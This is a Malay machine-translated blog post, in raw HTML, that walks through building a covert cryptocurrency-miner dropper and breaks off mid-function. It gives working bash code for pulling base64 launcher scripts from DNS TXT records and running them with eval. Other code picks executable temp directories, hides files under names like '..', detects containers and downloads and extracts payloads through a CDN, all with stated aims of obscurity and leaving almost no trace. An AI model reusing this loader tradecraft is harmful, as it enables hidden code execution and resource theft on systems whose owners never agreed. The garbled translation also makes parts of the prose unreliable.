-amp-start{0%{visibility:hidden}to{visibility:visible}}</style><noscript><style amp-boilerplate>body{-webkit-animation:none;-moz-animation:none;-ms-animation:none;animation:none}</style></noscript><link href=https://www.unto.re/ms/posts/chronichles_of_a_cryptonote_dropper/ rel=canonical><script type=application/ld+json>{"copyrightHolder":"untoreh","@id":"https://www.unto.re","url":"https://www.unto.re","copyrightYear":2021,"@context":"https://schema.org/","image":"/assets/appa.png","@type":"WebSite"}</script><script type=application/ld+json>{"audience":"cool people","url":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","mainContentOfPage":{"@type":"WebPageElement","cssSelector":".franklin-content"},"accessMode":["textual","visual"],"accessibilitySummary":"Visual elements are tentatively described.","description":"...How far are you willing to go for...pennies?","author":{"sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"email":"contact@unto.re","name":"untoreh","@type":"https://schema.org/Person","image":"/assets/appa.png"},"mentions":[],"@context":"https://schema.org","accessModeSufficient":{"itemListElement":["textual","visual"],"@type":"itemList"},"@type":"https://schema.org/WebPage","lastReviewed":"2021-08-21","dateCreated":"August 21, 2021","@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","dateModified":"2021-08-21","availableLanguage":[{"name":"English","@type":"Language"},{"name":"German","@type":"Language"},{"name":"Italian","@type":"Language"},{"name":"Mandarin Chinese","@type":"Language"},{"name":"Spanish","@type":"Language"},{"name":"Hindi","@type":"Language"},{"name":"Arabic","@type":"Language"},{"name":"Portuguese","@type":"Language"},{"name":"Bengali","@type":"Language"},{"name":"Russian","@type":"Language"},{"name":"Japanese","@type":"Language"},{"name":"Punjabi","@type":"Language"},{"name":"Javanese","@type":"Language"},{"name":"Vietnamese","@type":"Language"},{"name":"French","@type":"Language"},{"name":"Urdu","@type":"Language"},{"name":"Turkish","@type":"Language"},{"name":"Polish","@type":"Language"},{"name":"Ukranian","@type":"Language"},{"name":"Dutch","@type":"Language"},{"name":"Greek","@type":"Language"},{"name":"Swedish","@type":"Language"},{"name":"Zulu","@type":"Language"},{"name":"Romanian","@type":"Language"},{"name":"Malay","@type":"Language"},{"name":"Korean","@type":"Language"},{"name":"Thai","@type":"Language"},{"name":"Filipino","@type":"Language"}],"keywords":["crypto","net","shell"],"creativeWorkStatus":"Published","publisher":{"url":"https://www.unto.re","sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"contactPoint":{"contactType":"info","email":"contact@unto.re","@type":"ContactPoint","telephone":""},"logo":"/assets/appa.png","name":"untoreh's site","@type":"Organization"},"datePublished":"2021-08-21","inLanguage":"English","image":"/assets/appa.png","name":"","mainEntityOfPage":{"@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","@type":"Article"}}</script><script id=ldj-breadcrumbs type=application/ld+json>{"itemListElement":[{"position":1,"item":"https://www.unto.re","name":"Home","@type":"ListItem"},{"position":2,"item":"/posts/","name":"Posts List","@type":"ListItem"},{"position":3,"item":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper","name":"Chronicles of a cryptonote dropper","@type":"ListItem"}],"@type":"BreadcrumbList"}</script><link href=/assets/favicon.png rel=icon type=image/x-icon><link href=/assets/favicon.svg rel=icon type=image/svg+xml><title> Kronik penitis cryptonote</title><script type=application/ld+json>{"url":"/ms/posts/chronichles_of_a_cryptonote_dropper/","mainContentOfPage":{"@type":"WebPageElement","cssSelector":".franklin-content"},"accessMode":["textual","visual"],"mentions":null,"description":"","@context":"https://schema.org","accessModeSufficient":{"itemListElement":["textual","visual"],"@type":"itemList"},"@type":"https://schema.org/WebPage","lastReviewed":"","dateCreated":"","@id":"/ms/posts/chronichles_of_a_cryptonote_dropper/","dateModified":"","keywords":[],"creativeWorkStatus":"Published","translator":{"url":"http://google.translate.com","name":"Google Translate","@type":"https://schema.org/Organization"},"translationOfWork":{"@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/"},"datePublished":"2021-10-22T18:46:55.130","inLanguage":"ms","name":"","mainEntityOfPage":{"@id":"/ms/posts/chronichles_of_a_cryptonote_dropper/","@type":"Article"}}</script><script type=application/ld+json>{"sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"email":"contact@unto.re","name":"untoreh","@type":"https://schema.org/Person","image":"/assets/appa.png"}</script><script type=application/ld+json>{"potentialAction":{"query-input":"required maxlength=100 name=input","actionStatus":"https://schema.org/PotentialActionStatus","query":"required","@type":"SearchAction","target":{"uri":"","scheme":"https","userinfo":"","host":"www.unto.re","port":"","path":"/search","query":"q=%7Binput%7D","fragment":""}}}</script><script type=application/ld+json>{"potentialAction":{"query-input":"required maxlength=100 name=input","actionStatus":"https://schema.org/PotentialActionStatus","query":"required","@type":"SearchAction","target":{"uri":"","scheme":"https","userinfo":"","host":"www.unto.re","port":"","path":"/search","query":"q=%7Binput%7D","fragment":""}}}</script><body><div class=masthead><div class=masthead__menu__inner-wrap><div class=masthead__menu><a title="untoreh's site"class=site-title href=/ms/></a><div class=author__wrap><ul><li class=author__avatar><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer"title="Twitter link"href=https://twitter.com/untoreh><i class="fab fa-fw fa-twitter-square"aria-hidden=true></i></a><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer"title="GitHub link"href=https://github.com/untoreh><i class="fab fa-fw fa-github"aria-hidden=true></i></a><li class="author__urls social-icons"><a href=mailto:contact@unto.re title=email><i class="fas fa-envelope"></i></a><li></ul></div><nav id=site-nav><div class=horiz><ul><li class="lunrSearch masthead__menu-item hvr-outline-in"><li class="masthead__menu-item hvr-outline-in"><a title="All the articles that I have written"href=/ms/posts/><i class="fas fa-pen menu-icons"></i> jawatan</a><li class="masthead__menu-item hvr-outline-in"><a title="Video and audio content from streaming websites."href=/ms/media/><i class="fas fa-tv menu-icons"></i> media</a><li class="masthead__menu-item hvr-outline-in menu-lang-btn"title="Change website's language"></ul></div><div class=vert><ul><li class="lunrSearch masthead__menu-item hvr-outline-in"><li class="masthead__menu-item hvr-outline-in"><a title="All the articles that I have written"href=/ms/posts/><i class="fas fa-pen menu-icons"></i> jawatan</a><li class="masthead__menu-item hvr-outline-in"><a title="Video and audio content from streaming websites."href=/ms/media/><i class="fas fa-tv menu-icons"></i> media</a><li class="masthead__menu-item hvr-outline-in menu-lang-btn"title="Change website's language"></ul></div></nav></div></div></div><div><h1 id=title><a href=/ms/posts/chronichles_of_a_cryptonote_dropper> Kronik penitis cryptonote</a></h1><blockquote id=page-description style=font-style:italic>... Sejauh mana anda sanggup pergi ... wang?</blockquote></div><div class=franklin-content><p>Andaikan anda mahu menambang<a href=https://en.wikipedia.org/wiki/Cryptocurrency> mata wang kripto</a> di jauh<em> maya</em> perkakasan. Anda perlu mencari sesuatu untuk saya. Pelayan jauh bermaksud, tidak<a href=https://en.wikipedia.org/wiki/Application-specific_integrated_circuit> ASIC</a> atau GPU bukti algoritma kerja, pada dasarnya hanya<a href=\posts/a-few-notes-on-proof-of-work> Syiling mesra CPU</a>.<h2 id=the_software><a class=header-anchor href=#the_software> Perisian</a></h2><p>Cari dan cari a<a href=https://github.com/xmrig/xmrig> pelombong</a> , tetapi tidak begitu bagus, anda mahukan sesuatu yang dapat anda kendalikan dengan lebih jauh dari jauh, jadi anda dapati<a href=https://github.com/Bendr0id/xmrigCC> pelombong lain</a> . Anda juga mahukan a<a href=https://github.com/Bendr0id/xmrigcc-proxy> proksi</a> , kerana banyak sambungan akan berumur pendek, anda tidak mahu<a href=https://en.wikipedia.org/wiki/Denial-of-service_attack> dos</a> kolam perlombongan anda. Juga a<a href=https://github.com/search?q=tunnel> terowong</a> pasti bagus.<h2 id=the_design><a class=header-anchor href=#the_design> Rekaan</a></h2><p>Beberapa botnet menggunakan data blockchains untuk mencari perintah,<a href=https://twitter.com/sarahjamielewis> seseorang</a> nampaknya mempunyai<a href=https://web.archive.org/web/https://twitter.com/SarahJamieLewis/status/1185724467776851968> pertaruhan yang hilang</a> ini tidak berlaku lagi ... bagaimanapun kita tidak begitu canggih, kita akan mendapatkan dengan beberapa rekod DNS yang menyimpan skrip yang menarik muatan yang diekstrak sendiri dalam direktori temp melaksanakan dan meninggalkan<em> hampir</em> tiada jejak penyediaannya. Berikut adalah carta aliran kecil yang menggambarkan strukturnya<h2 id=launcher><a class=header-anchor href=#launcher> Pelancar</a></h2><p>Titik skrip permulaan adalah mudah diakses dan dikemas kini dengan mudah sehingga tahan terhadap ujian masa. Mengemas kini<a href=https://en.wikipedia.org/wiki/Domain_Name_System> DNS</a> rekod adalah mudah, dan DNS adalah perkara terakhir yang dimatikan dalam rangkaian..kerana alamat IP sukar diingat ... jadi kemungkinan ia akan tersedia sepanjang masa. Anda lihat ketika kita<em> mengambil skrip penyebaran</em>kami sebenarnya sudah menjalankan beberapa logik, ini adalah skrip pelancar, ia memerlukan kemampuan untuk melakukan pertanyaan DNS untuk mencari catatan kami, DNS mungkin ada di mana-mana tetapi<a href=https://web.archive.org/web/20201107155737/https://downloads.isc.org/isc/bind9/> menggali</a> tidak.<p>Terdapat sedikit teka-teki di sini, jika kita perlu memuat turun alat lain<em> untuk memuat turun skrip lain untuk memuat turun muatan</em> kita mesti memuat turun muatan! Dalam pertahanan ... melakukan tarian skrip ini menambah kekaburan, memungkinkan untuk menjaga hanya satu pelaksanaan peluncur (pemeliharaan, yay), tidak diperlukan sepanjang masa..Jadi kami juga melayani<a href=https://en.wikipedia.org/wiki/Standalone_program> dihubungkan secara statik</a> digali dapat dieksekusi untuk melakukan pertanyaan dns, diambil dengan hosting sendiri, atau hosting awan (ya ada kekurangan, seperti 3 atau 4, kerana perkhidmatan awan mempunyai lebar jalur percuma yang sangat minimum, dan juga memerlukan kuki atau token akses ... mereka sangat skrip tidak mesra, sengaja begitu, tentu saja).<p>Apa yang ada dalam rekod dns? Kami menggunakan<a href=https://en.wikipedia.org/wiki/TXT_record> TXT</a> rekod, pada domain tersuai (fallback di sini juga). Mengapa TXT? kebetulan mereka yang dapat menyimpan jumlah data terbanyak..biasanya kerana jenisnya<a href=https://www.ietf.org/rfc/rfc6763.txt> disyorkan</a> bergantung kepada<em> perkara</em> . Kami secara khusus menggunakan<a href=https://www.cloudflare.com/> kepulan awan</a> untuk memperjuangkan DNS kami kerana ia percuma, dan hanya satu-satunya pemain di bandar (<em> baik tidak benar-benar tetapi ciri-ciri pucat alternatif lain bijak</em> ). Ia berlaku bahawa anda dapat menyimpan beberapa keping data di<em> sama</em> rakam ... ini mula membingungkan dan mencari beberapa spesifikasi ... (tangen) Cloudflare<a href=https://web.archive.org/save/https://community.cloudflare.com/t/was-there-a-reduction-in-maximum-txt-size> pernah</a> benarkan<em> dirantai</em>Rekod TXT berjumlah ~ 9k byte, dokumen sekarang menyatakan ~ 2k bait, sebelum perubahan yang saya gunakan ~ 6k saya rasa, dan melayani skrip tanpa kompres, selepas itu saya harus menipis skrip dan memampatkannya sebelum tangan (sebenarnya saya cuba menggunakan a<a href=https://freedns.afraid.org/> freedns</a> pembekal, saya dilarang dalam satu hari, meneka mereka mempunyai polisi rekod TXT tanpa lemak yang ketat), namun pemampatan gzip nampaknya TIDAK mesra paip dan masih menimbulkan masalah, jadi saya terpaksa menguruskan skrip tanpa pemampatan ( tangen akhir).<p>Bagaimana kita menyimpannya? Rekod TXT hanya menyokong rentetan alfanumerik, tidak<a href=https://en.wikipedia.org/wiki/Null_character> NUL</a> , jadi kita harus membungkusnya menjadi pengekodan yang tidak kosong,<a href=https://en.wikipedia.org/wiki/Base64> asas64</a> memenuhi kekangan ini, dan kerana kita menyimpan<em> dirantai</em> TXT mencatat, kita harus memotong outputnya, kerana kita menggunakan shell shell, ini dilakukan melalui<code>-w</code> bendera, di busybox bendera seperti dulu tidak ada (atau ikut serta) pada versi lama yang menjengkelkan, alternatifnya adalah dengan menggunakan pengekod yang dibundel dengan openssl,<code>openssl enc -base64</code>.<p>Sekarang kita tahu bagaimana untuk menyimpan skrip penyebaran kita, kita juga menyimpannya<a href=https://web.archive.org/web/20210305071742/https://github.com/cloudflare/cloudflare-go/blob/master/cmd/flarectl/README.md> cf cli</a> atau secara manual. Bagaimana kita menariknya? Kami menyatakan bahawa kami memerlukan bindutil atau milik kami sendiri<code>dig</code> ... setelah memilih titik akhir penyampaian, kami ingin memuat turunnya, apa yang ada biasanya<a href=https://www.gnu.org/software/wget/> wget</a> atau<a href=https://curl.se/> kerinting</a> , wget didapati lebih kerap diprapasang, namun busybox hanya menyediakan sokongan dengan perpustakaan dinamik, jadi anda harus memastikan titik akhir melayani http atau utiliti anda<code>wget</code> dari gnu-utils<pre><code class="bash hljs"><span class=hljs-comment># the wget command</span>
wget -t 2 -T 10 -q -i- -O- > <span class=hljs-variable>$filename</span> <<< <span class=hljs-string>"<span class=hljs-variable>$digurl</span>"</span></code></pre><p>Ia bermaksud mencuba<code>-t2</code> masa menunggu<code>-T10</code> detik menjadi<code>-q</code> bacaan yang tenang dari<code>-i-</code> stdin (<code>$digurl</code> ) dan menulis kepada<code>-O-</code> stdout (<code>$filename</code>). Perintah ini tidak menunjukkan apa yang kita muat turun sekilas. Kita akan berhati-hati dengan perintah shell yang lain untuk alasan yang sama, atau berpegang pada shell (<a href=https://en.wikipedia.org/wiki/Bash_%28Unix_shell%29> bash</a> ) terbina dalam jika boleh. Berhati-hatilah di mana anda memuat turun eksekutif anda, anda ingin memastikan anda dapat melaksanakannya, kerana beberapa titik pemasangan, terutama di dalam bekas dan<code>tmp</code> jalan adalah<code>noexec</code> . Sekarang kita mempunyai alat pertanyaan dns, kita mengambil rekod kita<pre><code class="bash hljs">dig txt <span class=hljs-variable>${record}</span>.<span class=hljs-variable>${zone}</span> +short +tcp +timeout=3 +retries=0 <span class=hljs-variable>$dnsserver</span></code></pre><p>Bendera jelas di sini,<code>+short</code> hanya bermaksud bahawa kita hanya berminat dengan data itu sendiri, sehingga kita tidak perlu menguraikan hasilnya. Penting untuk menentukan pelayan DNS, seperti google (<code>8.8.8.8</code> atau awan awan (<code>1.1.1.1</code> ) kerana banyak persekitaran mengarahkan atau meminta proxy dns ke pelayan dns mereka sendiri secara lalai. Setelah mengambil skrip yang dipotong, kami berurusan dengan tanda petik dan ruang kosong untuk membuatnya siap untuk penyahkodan<pre><code class="bash hljs">data=<span class=hljs-variable>${data//\"}</span><span class=hljs-comment># remove quotes</span>
data=<span class=hljs-variable>${data// }</span><span class=hljs-comment># remove whitespace</span><span class=hljs-built_in>declare</span> -a ar_data
<span class=hljs-keyword>for</span> l <span class=hljs-keyword>in</span><span class=hljs-variable>$data</span>; <span class=hljs-keyword>do</span>
    ar_data[<span class=hljs-variable>${l:0:1}</span>]=<span class=hljs-variable>${l:1}</span><span class=hljs-comment># iterate over each line and remove the first characther</span><span class=hljs-keyword>done</span>
data=<span class=hljs-variable>${ar_data[@]}</span><span class=hljs-comment># join all the lines</span>
data=<span class=hljs-variable>${data// }</span><span class=hljs-comment># ensure joining didn't add whitespace</span><span class=hljs-comment># decode</span>
launcher=$(<span class=hljs-built_in>echo</span><span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span> | <span class=hljs-variable>$b64</span> -d -w <span class=hljs-variable>$chunksize</span>)</code></pre><p>Bagaimana jika sekarang kita<em> masih</em> tidak mempunyai pelancar kami? DNS tidak kemas, kami mahukan penggantian, mari siapkan subdomain untuk mengambil skrip pelancar secara langsung. Sebelum menilai skrip kami, kami ingin menyesuaikannya, dengan beberapa pemboleh ubah, sekali lagi membolehkan menggunakan catatan TXT untuk menyimpan NAME = NILAI senarai pemboleh ubah dan menguraikannya. Terdapat juga penggantian untuk pemboleh ubah, cloudflare menawarkan pengalihan berdasarkan URL, pengalihan ini dilayan<em> sebelum ini</em> tujuannya, jadi kami tidak memerlukan titik akhir, kami hanya ingin mengkonfigurasi peraturan pengalihan berdasarkan regex ke titik akhir rekaan, yang kami minati adalah parameter url<code>?NAME=VALUE&NAME2=VALUE2...</code>, supaya kita dapat mengatur peluncur kita hanya dengan mengubah url pengalihan, selalu dengan memperhatikan petikan dan melarikan diri dari kod<pre><code class="bash hljs"><span class=hljs-comment>## m1 also important to stop wget</span>
pl_vars=$(<span class=hljs-built_in>echo</span><span class=hljs-string>"<span class=hljs-variable>$token_url</span>"</span> | wget -t 1 -T 3 -q -i- -S 2>&1 | grep -m1 <span class=hljs-string>'Location'</span>)
pl_vars=<span class=hljs-variable>${pl_vars#*\/}</span>
pl_vars=<span class=hljs-variable>${pl_vars//\"&/\" }</span>
pl_vars=<span class=hljs-variable>${pl_vars//%3F/\?}</span></code></pre><p>Kesukaran<code>-S</code> mencetak url pengalihan yang kami minati untuk dihuraikan. Memiliki parameter dan skrip, kami menilai pemboleh ubah yang menuliskannya melalui fail<pre><code class="bash hljs"><span class=hljs-built_in>eval</span><span class=hljs-string>"<span class=hljs-variable>$pl_vars</span>"</span><span class=hljs-built_in>echo</span><span class=hljs-string>"export \
<span class=hljs-variable>$pl_vars</span> \
<span class=hljs-variable>$ENV_VARS</span> \
"</span>>env.sh</code></pre><p>Fail ini akan bersumber dari skrip deploy. Bahagian terakhir skrip permulaan adalah sebenar<a href=https://en.wikipedia.org/wiki/Trampoline_(computing)> trampolin</a> , menilai skrip dalam proses shell semasa, atau mungkin membiarkannya dikendalikan oleh tmux jika mungkin.<pre><code class="bash hljs"><span class=hljs-comment># printf preserves quotes</span><span class=hljs-built_in>eval</span><span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span>)</span>"</span> &>/dev/null
<span class=hljs-comment># or tmux</span><span class=hljs-built_in>echo</span><span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span> > <span class=hljs-string>".. "</span>
tmux send-keys -t miner <span class=hljs-string>". ./\".. \""</span> Enter</code></pre><p>Skrip pelancar dibuang ke fail bernama ".." ini kelihatan membingungkan kerana boleh disalah anggap sebagai<em> ibu bapa</em> direktori. Dan kami tidak memasukkan perintah sesi, seperti yang akan terjadi dalam perintah proses, sebaliknya kami memulai sesi tmux sebelumnya dan mengirim perintah sumber melalui antara muka terminal tmux. Berkaitan dengan ini, kadang-kadang memanggil pelaksana dengan<code>./</code> menyimpan watak-watak tersebut dalam perintah, jadi lebih baik menambahkannya<code>$PWD</code> ke jalan ..<code>PATH=$PWD:$PATH</code>.<h2 id=the_payload><a class=header-anchor href=#the_payload> Muatan</a></h2><p>Skrip menyebarkan kami bermula dengan mendapatkan sumber<code>env.sh</code> fail, dan menyimpan atau dikonfigurasi vars sebagai<code>STARTING_*</code> vars seperti<pre><code class="bash hljs">STARTING_PATH=<span class=hljs-variable>${STARTING_PATH:-<span class=hljs-variable>$PATH</span>}</span>
STARTING_PID=<span class=hljs-variable>$BASHPID</span></code></pre><p>Ini membolehkan kita membunuh dan menghidupkan semula instance yang sedang berjalan sambil mengatur semula persekitaran. Mari beralih ke direktori tmp dengan kemampuan exec<pre><code class="bash hljs"><span class=hljs-comment># out local subdirectory</span>
pathname=$(<span class=hljs-built_in>printf</span><span class=hljs-string>".%-<span class=hljs-subst>$((RANDOM%9+1)</span>)s"</span><span class=hljs-keyword>for</span> ph <span class=hljs-keyword>in</span> {/tmp,/dev/shm,/run,/var/tmp,/var/cache,~/.<span class=hljs-built_in>local</span>,~/.cache,~/}; <span class=hljs-keyword>do</span>
    rm -rf <span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        mkdir -p <span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        tmppath=<span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        is_path_executable <span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span> &&
        <span class=hljs-built_in>export</span> PATH=<span class=hljs-string>"<span class=hljs-variable>${ph}</span>/<span class=hljs-variable>$pathname</span>:<span class=hljs-variable>${PATH}</span>"</span> tmppath &&
        <span class=hljs-built_in>break</span><span class=hljs-keyword>done</span>
[ -n <span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span> ] && <span class=hljs-built_in>cd</span><span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span></code></pre><p>Memeriksa sama ada dalam a<a href=https://en.wikipedia.org/wiki/OS-level_virtualization> bekas</a> juga berguna, kita dapat memeriksa sistem fail untuk petunjuk<pre><code class="bash hljs">c=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/etc/cpa*'</span>)
d=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/dev/*'</span>)
s=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/sys/*'</span>)
p=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/proc/*'</span>)
jail=
<span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$c</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$d</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$s</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$p</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-comment>## we are in a jail</span>
    jail=1
<span class=hljs-keyword>fi</span></code></pre><p>Sekarang tiba masanya untuk memuat turun muatan kami, kami memilih untuk menyokong kedua wget dan curl, kami sudah tahu bagaimana menggunakan wget dengan bendera yang berhati-hati, untuk curl itu sedikit berbeza. Kita harus membuat fail konfigurasi, dan menimpa<code>CURL_HOME</code><pre><code class="bash hljs"><span class=hljs-built_in>echo</span><span class=hljs-string>"url = <span class=hljs-variable>$uri</span>
output = <span class=hljs-variable>${name}</span><span class=hljs-variable>${format}</span>
connect-timeout = 10
"</span> > .curlrc
CURL_HOME=<span class=hljs-variable>$PWD</span> curl -sOL</code></pre><p>Langkah terakhir adalah untuk mengekstrak muatan<pre><code class="bash hljs"><span class=hljs-built_in>type</span> unzip &>/dev/null &&
    format=<span class=hljs-string>".zip"</span> extract=<span class=hljs-string>"unzip -q"</span> ||
        format=<span class=hljs-string>".tar.gz"</span> extract=<span class=hljs-string>"tar xf"</span></code></pre><p>Perlu disebutkan penggunaan [CDN] untuk melayani muatan. Di sini lagi cloudflare untuk menyelamatkan menyelamatkan kita dari perbelanjaan lebar jalur. Dengan hanya menukar nama muatan terkompresi kita dengan a<em> sambungan fail</em> disokong oleh cloudflare ... ia menjadi cache. Cloudflare tidak memeriksa tajuk apa yang dilayannya, mungkin kerana melakukannya pada skala itu tidak praktikal.<h2 id=adventures_down_bashland><a class=header-anchor href=#adventures_down_bashland> Adventures menyusuri Bashland</a></h2><p>Bash dipilih dengan anggapan mudah alih, tidak terlalu ketinggalan zaman dan lebih banyak terdapat pada bahasa skrip lain seperti perl, ruby â€‹â€‹atau python. Yang benar adalah bahawa binari mandiri yang ditulis dalam golang atau lua akan jauh lebih mudah, dengan sedikit bug, dan lebih mudah dikekalkan, pada dasarnya bash adalah pilihan terburuk yang mungkin, dalam pembelaan saya, pada masa saya menggaruk banyak gatal dengan bash , sudah terlambat untuk menulis semula, dan juga menjadi agak membosankan.<p>Terdapat juga pilihan untuk menggunakan busybox dengan bendera waktu kompilasi untuk menggunakan semua builtin (seperti grep dan sed), namun menggunakan builtin dengan cara ini tidak memungkinkan untuk melahirkan pekerjaan (garpu) dan mendedahkan daemon kepada kemungkinan kebuntuan.<p>Saya akan menerangkan beberapa fungsi bash di sini, dengan senarai penuh tersedia<a href=\assets/posts/bash_functions.txt> di sini</a><pre><code class="bash hljs"><span class=hljs-comment>## echo a string long $1 of random lowercase chars</span><span class=hljs-function><span class=hljs-title>rand_string</span></span>() {
    <span class=hljs-built_in>local</span> c=0
    <span class=hljs-keyword>while</span> [ <span class=hljs-variable>$c</span> -lt <span class=hljs-variable>$1</span> ]; <span class=hljs-keyword>do</span><span class=hljs-built_in>printf</span><span class=hljs-string>"\x<span class=hljs-subst>$(printf '%x' $((97+RANDOM%25)</span>))"</span>
        c=$((c+<span class=hljs-number>1</span>))
    <span class=hljs-keyword>done</span>
}</code></pre><p>Menggunakan<code>RANDOM</code> pemboleh ubah untuk mendapatkan nombor antara 97-122 yang sepadan dengan kod aksara, printf mestilah builtin, kami tidak mahu garpu dalam satu gelung.<pre><code class="bash hljs"><span class=hljs-comment>## make a new file descriptor named $1</span><span class=hljs-function><span class=hljs-title>newfd</span></span>() {
    <span class=hljs-built_in>eval</span><span class=hljs-string>"local fd=\${<span class=hljs-variable>$1</span>}"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"exec <span class=hljs-variable>$fd</span>>&-"</span> &>/dev/null
    <span class=hljs-built_in>local</span> pp=<span class=hljs-string>".<span class=hljs-subst>$(rand_string 8)</span>"</span>
    mkfifo <span class=hljs-variable>$pp</span><span class=hljs-built_in>unset</span><span class=hljs-string>"<span class=hljs-variable>$1</span>"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"exec {<span class=hljs-variable>$1</span>}<><span class=hljs-variable>$pp</span>"</span><span class=hljs-comment># unlink the named pipe</span>
    rm -f <span class=hljs-variable>$pp</span>
}</code></pre><p>Manfaatkan paip untuk membuat deskriptor fail tanpa nama, ini tidak berkelakuan sama seperti deskriptor fail tetapi ia cukup baik<a href=https://en.wikipedia.org/wiki/Inter-process_communication> IPC</a>.<pre><code class="bash hljs"><span class=hljs-comment>## https://unix.stackexchange.com/a/407383/163931</span><span class=hljs-function><span class=hljs-title>fleep</span></span>()
{
    <span class=hljs-comment># log "fleep: called by ${FUNCNAME[1]}"</span>
    [ -n <span class=hljs-string>"<span class=hljs-variable>${_snore_fd}</span>"</span> -a <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> != 0 ] ||
        newfd _snore_fd
    <span class=hljs-comment># log "fleep: starting waiting with ${_snore_fd}"</span><span class=hljs-keyword>if</span> ! <span class=hljs-built_in>command</span> >&<span class=hljs-variable>${_snore_fd}</span>; <span class=hljs-keyword>then</span>
        newfd _snore_fd
    <span class=hljs-keyword>fi</span><span class=hljs-built_in>read</span> -t <span class=hljs-variable>${1:-1}</span> -u <span class=hljs-variable>$_snore_fd</span><span class=hljs-comment># log "fleep: ended"</span>
}</code></pre><p>Tidur tanpa forking, dengan menyalahgunakan fungsi timeout read builtin, ia menggunakan deskriptor fail khusus dan kita mesti memastikannya tersedia untuk mengelakkan penamatan.<p>Terdapat fungsi seperti<code>get_pid_stats</code>, <code>usgmon_prc</code>, <code>proc_usg_u</code>, <code>cpumon</code>, <code>loadmon</code> digunakan untuk memantau penggunaan sistem, semuanya menggunakan linux<code>/proc</code> fail tanpa alatan seperti<code>ps</code> , jadi tidak ada garpu, semua bash tulen.<pre><code class="bash hljs"><span class=hljs-function><span class=hljs-title>start_coproc</span></span>() {
    <span class=hljs-built_in>local</span><span class=hljs-built_in>unset</span><span class=hljs-keyword>while</span> :; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> = <span class=hljs-built_in>exec</span> ]; <span class=hljs-keyword>then</span>
            coproc_name=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span><span class=hljs-keyword>else</span>
            coproc_name=<span class=hljs-string>"<span class=hljs-variable>$1</span>"</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$UNSET_COPROC_VARS</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-built_in>unset</span>=<span class=hljs-string>"unset <span class=hljs-variable>$UNSET_COPROC_VARS</span>;"</span><span class=hljs-keyword>fi</span><span class=hljs-built_in>log</span><span class=hljs-string>"starting coproc <span class=hljs-variable>$coproc_name</span>"</span><span class=hljs-built_in>unset</span> -v <span class=hljs-string>"<span class=hljs-variable>$coproc_name</span>"</span><span class=hljs-comment>## only the variable, not functions</span><span class=hljs-built_in>eval</span><span class=hljs-string>"coproc <span class=hljs-variable>$coproc_name</span> { <span class=hljs-variable>$unset</span> $*; }"</span><span class=hljs-comment># 2>/dev/null</span><span class=hljs-built_in>unset</span> UNSET_COPROC_VARS
        wait_coproc <span class=hljs-string>"<span class=hljs-variable>$coproc_name</span>"</span> 3 && <span class=hljs-built_in>break</span><span class=hljs-keyword>done</span>
}
<span class=hljs-function><span class=hljs-title>stop_coproc</span></span>() {
    <span class=hljs-comment>## clear fds</span>
    id_coproc <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> && [ -n <span class=hljs-string>"<span class=hljs-variable>$job_n</span>"</span> ] && <span class=hljs-built_in>eval</span><span class=hljs-string>"kill -<span class=hljs-variable>${2:-9}</span> %<span class=hljs-variable>$job_n</span>"</span> ||
        { <span class=hljs-built_in>eval</span><span class=hljs-string>"kill -<span class=hljs-variable>${2:-9}</span> \${<span class=hljs-variable>${1}</span>_PID}"</span>; } ||
        { <span class=hljs-built_in>log</span><span class=hljs-string>"could not kill the specified coprocess with job <span class=hljs-variable>$job_n</span>"</span> && <span class=hljs-built_in>return</span> 1; }
}</code></pre><p>Coprocesses tersedia sejak bash<code>v4</code> , mereka seperti pekerjaan kecuali mereka mempunyai nama dan deskriptor fail mereka sendiri.<pre><code class="bash hljs"><span class=hljs-comment>## clear file descriptors</span><span class=hljs-function><span class=hljs-title>clear_fds</span></span>() {
    <span class=hljs-built_in>local</span> fd
    <span class=hljs-keyword>for</span> fd <span class=hljs-keyword>in</span> $(compgen -G <span class=hljs-string>"/proc/<span class=hljs-variable>$BASHPID</span>/fd/*"</span>); <span class=hljs-keyword>do</span>
